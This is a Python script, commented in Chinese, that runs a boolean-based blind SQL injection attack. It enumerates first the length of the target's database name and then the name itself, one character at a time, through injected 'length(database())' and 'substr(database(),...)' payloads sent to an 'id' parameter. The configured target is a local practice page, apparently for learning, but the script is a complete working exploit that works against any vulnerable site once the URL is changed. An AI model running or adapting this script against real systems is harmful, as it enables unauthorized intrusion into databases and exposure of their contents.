"""
数据库名布尔盲注爆破脚本
适用环境：本地 SQL-Injection.php 测试页面
判断依据：页面返回内容包含 "User:" 表示条件为真
"""

import string
import requests
import sys

# 配置
TARGET_URL = "http://localhost/SQL-Injection.php"
TIMEOUT = 5           # 请求超时时间
MAX_LENGTH = 20       # 数据库名最大长度（可根据需要调整）

# 字符集：数字、大小写字母、下划线
CHARSET = string.digits + string.ascii_letters + '_'

def make_request(payload):
    """发送请求并返回响应文本，异常时返回 None"""
    try:
        params = {'id': payload}
        resp = requests.get(TARGET_URL, params=params, timeout=TIMEOUT)
        return resp.text
    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return None

def is_true(html):
    """判断页面是否为真（存在 User: 表示有数据返回）"""
    return html is not None and "User:" in html

def get_database_length():
    """爆破数据库长度"""
    print("[*] 正在爆破数据库长度...")
    for length in range(1, MAX_LENGTH + 1):
        # 构造 payload: 1' and length(database())=长度 -- -
        payload = f"1' and length(database())={length} -- -"
        html = make_request(payload)
        if is_true(html):
            print(f"[+] 数据库长度: {length}")
            return length
    print("[-] 未找到数据库长度（可能超过 MAX_LENGTH 或页面特征异常）")
    sys.exit(1)

def get_database_name(length):
    """逐字符爆破数据库名"""
    print("[*] 正在爆破数据库名...")
    db_name = ""
    for pos in range(1, length + 1):
        found = False
        for ch in CHARSET:
            # 构造 payload: 1' and substr(database(),位置,1)='字符' -- -
            payload = f"1' and substr(database(),{pos},1)='{ch}' -- -"
            html = make_request(payload)
            if is_true(html):
                db_name += ch
                print(f"[+] 第 {pos} 位: {ch}")
                found = True
                break
        if not found:
            print(f"[-] 第 {pos} 位未匹配到字符，可能超出字符集范围，置为 '?'")
            db_name += '?'
    return db_name

def main():
    print("=" * 50)
    print("SQL 注入布尔盲注 - 数据库名爆破")
    print("=" * 50)
    
    # 1. 获取长度
    length = get_database_length()
    
    # 2. 获取名称
    name = get_database_name(length)
    
    print("\n" + "=" * 50)
    print(f"[最终结果] 数据库名: {name}")
    print("=" * 50)

if __name__ == "__main__":
    main()